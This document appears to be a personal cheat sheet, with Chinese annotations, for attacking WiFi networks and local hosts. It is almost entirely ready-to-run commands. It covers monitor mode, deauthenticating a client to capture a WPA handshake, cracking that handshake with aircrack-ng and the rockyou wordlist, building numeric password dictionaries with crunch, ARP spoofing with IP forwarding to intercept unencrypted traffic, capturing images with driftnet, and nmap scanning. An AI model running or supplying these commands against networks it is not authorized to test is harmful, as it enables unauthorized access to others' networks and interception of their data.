### wifi相关
    ```
    iwconfig 
    iwconfig wlan0 mode monitor 修改网卡模式为监听
    ifconfig 
    ifconfig -a 
    ifconfig wlan0 up 启用网卡
    ifconfig wlan0 down 禁用网卡
    fping -g 192.168.1.5/24 查看ip占用情况
    airodump-ng wlan0mon 
    airmon-ng start wlan0 启用网卡监听
    airmon-ng stop wlan0mon 关闭网卡监听
    
    airodump-ng -c ch --bssid bssid           -w  存储目录 设备
    airodump-ng -c 3 --bssid D4:9E:05:31:51:DD -w ./       wlan0mon
    aireplay-ng -0 2 -a D4:9E:05:31:51:DD -c C4:4F:33:CE:12:97 wlan0mon 发送重新连接wifi命令,用于抓包
    
    aircrack-ng -a2 -b bssid -w 密码字典                         wifi抓包
    aircrack-ng -a2 -b D4:9E:05:31:51:DD -w /usr/share/wordlists/rockyou.txt ./-02.cap
    
    gunzip rockyou.txt.gz 解压gz文件
    
    
    crunch 8 8 -t 19%%%%%% -o /home/key/num 覆盖模式生成19开头的八位数字典
    crunch 8 8 -t 20%%%%%% >> /home/key/num 追加模式生成20开头的八位数字典
    
    cat /proc/sys/net/ipv4/ip_forward 查看转发策略
    echo 0 > /proc/sys/net/ipv4/ip_forward 修改转发策略为禁止转发
    echo 1 > /proc/sys/net/ipv4/ip_forward 修改转发策略为允许转发
    arpspoof -i wlan1 -t 192.168.1.3 192.168.1.1 (转发策略下,抓取非https数据,非转发策略下,网络堵塞)
    driftnet -i wlan1 抓取图片
    
    nmap 192.168.1.1 扫描端口
    ```